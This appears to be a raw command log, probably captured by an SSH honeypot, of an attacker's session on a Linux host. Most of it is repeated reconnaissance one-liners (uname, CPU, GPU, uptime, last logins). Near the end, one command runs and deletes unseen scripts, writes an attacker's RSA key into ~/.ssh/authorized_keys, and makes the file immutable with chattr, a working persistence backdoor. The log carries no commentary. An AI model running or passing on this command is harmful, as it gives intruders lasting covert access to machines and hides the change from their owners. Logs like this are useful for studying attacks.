"ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -m
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
